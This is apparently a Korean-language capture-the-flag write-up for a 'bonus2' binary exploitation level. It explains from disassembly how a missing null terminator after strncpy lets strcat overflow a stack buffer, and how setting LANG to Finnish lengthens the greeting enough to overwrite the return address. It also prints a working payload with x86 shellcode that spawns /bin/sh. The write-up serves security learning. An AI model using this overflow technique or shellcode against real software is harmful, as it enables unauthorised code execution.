> Password: 579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245

bonus2 프로그램을 인자와 함께 실행시키면

```
$ ./bonus2 aa bb
Hello aa
```

인자에 대해서 인사를 해주는 프로그램인 것을 볼 수 있다.

어셈블리 코드를 보면 main함수에서 strncpy를 argv[1], argv[2]에 대해서 호출하여 복사본을 스택에 넣은 이후

```
8048564:	c7 44 24 08 28 00 00 	movl   $0x28,0x8(%esp)
 804856b:	00 
 804856c:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048570:	8d 44 24 50          	lea    0x50(%esp)<local::char[40]>,%eax
 8048574:	89 04 24             	mov    %eax,(%esp)
 8048577:	e8 44 fe ff ff       	call   80483c0 <strncpy(0x50+%esp, argv[1], 40)@plt>
```

greetuser 함수를 호출하여
```
 804862b:	e8 54 fe ff ff       	call   8048484 <greetuser>
```

"Hello " 문자열 뒤에 인자로 받은 문자열을 strcat으로 붙인 뒤 출력하는 것을 볼 수 있다.
```
 804850a:	8d 45 08             	lea    0x8(%ebp),%eax
 804850d:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048511:	8d 45 b8             	lea    -0x48(%ebp),%eax
 8048514:	89 04 24             	mov    %eax,(%esp)
 8048517:	e8 54 fe ff ff       	call   8048370 <strcat(local::char[72], )@plt>
```

이번 문제도 지난번 문제와 유사하게 strncpy가 n보다 길이가 길거나 같은 문자열을 넣었을 때 null-term을 하지 않고, 그것을 이용해서 strcat에서 버퍼 크기를 벗어나는 문자열을 스택 영역에 넣을 수 있는 점을 이용할 수 있다.

다만 이번에는 앞서 말한 방법으로 만들 수 있는 문자열의 길이가 최대 0x28 + 0x20 + strlen("Hello ") = 78인데 ebp + 0x4를 완전히 덮기 위해서는 80byte가 필요하다.

따라서 부족한 2byte를 보충하기 위해서 코드를 유심히 보면

getenv("LANG")를 호출하고 결과 문자열을 미리 저장된 문자열과 비교하여 다른 언어로 인사말을 표시하는 로직을 확인할 수 있다.

```
 804859f:	c7 04 24 38 87 04 08 	movl   $0x8048738,(%esp)
 80485a6:	e8 d5 fd ff ff       	call   8048380 <getenv("LANG")@plt>
 [...]
```

실제로 환경변수 LANG에 fi를 넣고 프로그램을 실행하면, 필란드어로 인사를 해주는 것을 볼 수 있는데

```bash
$ LANG=fi ./bonus2 aa bb
Hyvää päivää aa
```

이 인사말은 Hello보다 훨씬 길어서 이 인사말을 이용하면 ebp + 0x4를 완전히 덮기 충분할 것 같다.

```bash 
LANG=fi ./bonus2 $(python -c 'print "AAAAAAAAAAAAAAAAAAAAAAAAAA1\xc0Ph//shh/bin\x89",') $(python -c 'print "\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x801\xc0@\xcd\x80BBBB\xe8\xf5\xff\xbf",')
```

주의할 점)

쉘코드가 스택에 들어가기 때문에 쉘코드 자체에 들어가는 push등의 로직에 의해서 스스로 쉘코드가 손상되어 SIGSEGV를 받는 일이 일어나는데 

이전 문제에서는 스택이 넉넉해서 스택에 매우 높은 위치에 쉘코드를 넣는 방법으로 문제를 해결했었지만, 이번 문제에서는 스택이 넉넉하지 않아서 python을 이용해서 모든 가능한 입력을 시도해보고 그 중 정상적으로 작동하는 입력을 선택하는 방법으로 해결했다. (`source.py`참고)
